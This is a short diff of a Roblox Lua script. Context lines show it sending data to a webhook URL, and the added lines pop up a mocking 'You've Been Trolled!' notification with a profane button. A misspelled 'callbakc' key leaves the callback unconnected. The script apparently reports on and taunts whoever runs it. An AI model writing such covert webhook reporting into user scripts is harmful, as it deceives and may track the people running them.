@@ -83,3 +83,24 @@ local webhookData = createWebhookData()
 
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
+
+wait(1)
+local function callback(text)
+    if text == "Yes" then
+    print("User said yes")
+    elseif text == "No" then
+    print("User said no")
+    end
+end
+ 
+local bindableFunction= Instance.new("BindableFunction")
+ 
+game.StarterGui:SetCore("SendNotification", {
+    Title = "You've Been Trolled!";
+    Text = "Hahaha!";
+    Icon = "RBXID OR BLANK";
+    Duration = "60";
+    callbakc = bindableFunction;
+    Button1 = "Awww";
+    Button2 = "Fuck U Scammer";
+})
